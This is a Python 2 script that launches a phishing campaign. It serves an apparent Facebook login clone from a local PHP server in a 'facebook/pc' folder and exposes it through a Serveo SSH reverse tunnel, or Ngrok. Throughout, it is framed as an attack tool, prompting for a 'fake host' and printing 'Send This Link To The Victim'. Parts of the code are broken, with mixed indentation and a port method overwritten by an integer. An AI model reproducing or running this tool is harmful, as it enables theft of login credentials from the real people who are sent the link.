#!/usr/bin/python
# coding=utf-8 
#//Coded By : Cabdulahi Sharif
import os,sys,time,requests
import sys,time,os
import income2
import pc
import subprocess as cadow
prred = ("\033[91m")
green = ("\033[92m")
pryellow = ("\033[93m")
prLightPurple=("\033[94m")
prCyan=("\033[96m")
prgray = ("\033[97m")
prBlack=("\033[98m")
p  = '\033[35m' # purple
c  = '\033[36m' # cyan
huh = '\033[32;1m'

cade = ("")
class action:
  def __init__(self):
      print
      self.host= raw_input(green+'[💉]Set Fake Host:'+green+' ')
      print
      time.sleep(0.2)
      if(self.host==''):
          return action()
      else:
          return self.port()
  def port(self):
      self.port = int(raw_input(green+'[📌]Set Port :'+green+' '))
      print
      if(self.port==''):
          return self.port()
      else:
          return self.ser()
  def ser(self):
      print '-'*43
      print
      print (c+'         [🌍]Choose Server')
      print
      print (prred+' [{1}]'+green+' Serveo')
      print (prred+' [{2}]'+green+' Ngrok')
      print (prred+' [{0}]'+green+' None')
      print
      serr= raw_input('[💉]Choose Option : ')
      if (serr==''):
          time.sleep(1)
          exit()
      else:
          if (serr=='1'):
              return self.servio()
          elif (serr=='2' or serr=='0'):
              return self.local()
  def action2(self):
      print
      self.host= raw_input(green+'[💉]Set Fake Host:'+green+' ')
      print
      time.sleep(0.2)
      if(self.host==''):
          return action()
      else:
          return self.port()
  def servio(self):
      while True:
          with open("logs.txt","w") as cade:
		      	cadow.Popen(
				["php","-S","localhost:{}".format(self.port),"-t","facebook/pc"],stderr=cadow.PIPE,stdin=cade,stdout=cade)
		        print
		        print ('[💊]Send This Link To The Victim : http://{}.serveo.net '.format(self.host))
		        os.system('ssh -R {}.serveo.net'.format(self.host)+':80:localhost:{} serveo.net'.format(self.port))
          print
          income2.home()
  def local(self):
      print
      while True:
          with open("logs.txt","w") as cade:
		      	cadow.Popen(
				["php","-S","localhost:{}".format(self.port),"-t","facebook/pc"],stderr=cadow.PIPE,stdin=cade,stdout=cade)
		        print
		        print ('[🌐]Listening Localhost On 127.0.0.1:{}'.format(self.port))
		        time.sleep(1)
		        income2.home()